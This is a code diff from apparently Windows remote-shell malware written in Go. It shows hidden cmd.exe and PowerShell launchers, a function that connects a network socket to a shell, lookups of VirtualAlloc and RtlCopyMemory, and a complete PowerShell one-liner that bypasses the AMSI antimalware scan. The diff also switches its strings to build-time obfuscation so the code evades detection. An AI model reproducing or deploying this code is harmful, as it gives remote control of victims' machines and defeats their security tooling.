@@ -21,11 +21,11 @@ const (
 )
 
 var (
-	kernel32         = syscall.MustLoadDLL(utils.Bake("EwYGFgYYS1FaHA8Y"))
-	ntdll            = syscall.MustLoadDLL(utils.Bake("FhcQFA9aHA8Y"))
-	VirtualAlloc     = kernel32.MustFindProc(utils.Bake("LgoGDBYVFCIYFAwX"))
-	RtlCopyMemory    = ntdll.MustFindProc(utils.Bake("KhcYOwwEAS4RFQwGAQ=="))
-	procSetStdHandle = kernel32.MustFindProc(utils.Bake("KwYAKxcQMAIaHA8R"))
+	kernel32         = syscall.MustLoadDLL(utils.Bake("§kernel32.dll§"))
+	ntdll            = syscall.MustLoadDLL(utils.Bake("§ntdll.dll§"))
+	VirtualAlloc     = kernel32.MustFindProc(utils.Bake("§VirtualAlloc§"))
+	RtlCopyMemory    = ntdll.MustFindProc(utils.Bake("§RtlCopyMemory§"))
+	procSetStdHandle = kernel32.MustFindProc(utils.Bake("§SetStdHandle§"))
 )
 
 // SetStdHandle https://docs.microsoft.com/de-de/windows/console/setstdhandle
@@ -42,23 +42,23 @@ func SetStdHandle(stdhandle int32, handle syscall.Handle) error {
 
 // Shell ...
 func Shell() *exec.Cmd {
-	cmd := exec.Command("C:\\Windows\\System32\\cmd.exe")
+	cmd := exec.Command(utils.Bake("§C:\\Windows\\System32\\cmd.exe§"))
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	return cmd
 }
 
 // Powershell ...
 func Powershell() (*exec.Cmd, error) {
-	// $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
-	amsiBypass := utils.Bake("XAJJIzERHj5aORAHHQ4WFBpaPwYALBoEHRBcUVgyFxERGQAcUEcWWAoaWEcVUUMPEQVUUEcWVi0VFQZUVQ8dEwZUWkkdLRcdFBBWUUMPXABJXAEJBVhQHF5QG00zHRcyEQYYHBBcXy0bFjMBGg8dG08nDAIAEQBTUVgyFxERGQAcUEcRWAoaWEcQUUMPEQVUUEcRVi0VFQZUVQ8dEwZUWkk3Fw0AHRsAWkpUA0cSRUcRBR5PXARJXAVaPwYALgIYDQZcXA0BFA9dQzg9FhckDBEpXBMACl5QH1gvMQ0AS1EvJT5QGhYSWF5UOEtEUVgvKxoHDAYZVjEBFhcdFQZaMQ0AHREbCDARChUdGwYHVi4VChAcGQ8pQlk3FxMNUEcWDQVYWFNYWEcEDBFYWFJd")
-	cmd := exec.Command("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "-exec", "bypass", "-NoExit", "-command", string(amsiBypass))
+	amsiBypass := utils.Bake(`§$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)§`)
+	//fmt.Println(amsiBypass)
+	cmd := exec.Command(utils.Bake("§C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe§"), "-exec", "bypass", "-NoExit", "-command", string(amsiBypass))
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	return cmd, nil
 }
 
 // ExecShell ...
 func ExecShell(command string, c net.Conn) {
-	cmd := exec.Command("\\Windows\\System32\\cmd.exe", "/c", command+"\n")
+	cmd := exec.Command(utils.Bake("§\\Windows\\System32\\cmd.exe§"), "/c", command+"\n")
 	rp, wp := io.Pipe()
 	cmd.Stdin = c
 	cmd.Stdout = wp
